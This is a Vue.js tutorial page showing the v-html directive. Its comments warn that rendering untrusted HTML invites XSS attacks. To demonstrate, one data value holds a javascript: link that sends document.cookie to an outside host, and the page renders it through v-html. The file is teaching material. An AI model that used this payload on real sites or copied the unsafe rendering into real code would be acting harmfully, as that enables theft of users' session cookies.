<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <!--  
        v-html
            1. 作用：向指定节点中渲染包括html结构额内容
            2. 与插值语法的区别
                1） v-html会替换掉节点中的所有内容 但是{{XXX}}-插值语法不会
                2） v-html可以识别html结构
            3. 严重注意 v-html有安全性问题
                1） 在网站上动态渲染任意HTML是非常危险的 容易导致XSS攻击
                2） 一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上
    -->
    <div id="root">
        <h2>Hello {{ name }}</h2>
        <h3 v-html="str"></h3>
        <!-- 有安全性问题 -->
        <h3 v-html="str2"></h3>
        <!-- 会被获取cookie -->
        <h3 v-html="str3"></h3>
    </div>
</body>
<script>
    Vue.config.productionTip = false
    new Vue({
        el: "#root",
        data(){
            return {
                name: "Ye",
                str: "Qing",
                str2: "<h3>Please Click it</h3>",
                str3: '<a href=javascript:location.href="www.baidu.com?"+document.cookie>I can get your cookies</a>'
            }
        }
    })
</script>
</html>
